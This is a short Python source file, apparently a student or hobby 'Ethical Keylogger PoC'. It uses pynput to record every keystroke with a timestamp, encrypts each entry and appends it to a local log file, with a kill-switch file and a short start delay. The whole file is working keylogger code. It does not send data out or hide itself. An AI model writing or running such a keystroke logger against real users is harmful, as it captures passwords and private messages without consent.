from pynput import keyboard
from datetime import datetime
import os
import time
from cryptography.fernet import Fernet
from encryptor import encrypt_data
LOG_DIR= "logs"
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = "logs/encrypted_logs.bin"
KILL_SWITCH_FILE = "kill_switch.txt"

def kill_switch_active():
    """
    Stops keylogger if kill switch file exists
    """
    return os.path.exists(KILL_SWITCH_FILE)

def write_log(data: bytes):
    """
    Write encrypted data to log file
    """
    with open(LOG_FILE, "ab") as f:
        f.write(data + b"\n")

def on_press(key):
    if kill_switch_active():
        print("[!] Kill switch activated. Stopping keylogger.")
        return False

    try:
        key_data = f"{datetime.now()} - {key.char}"
    except AttributeError:
        key_data = f"{datetime.now()} - [{key}]"

    encrypted = encrypt_data(key_data)
    write_log(encrypted)

def main():
    print("[+] Ethical Keylogger PoC started")
    print("[+] Press keys... (Kill switch enabled)")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # Safety delay before start
    time.sleep(3)
    main()
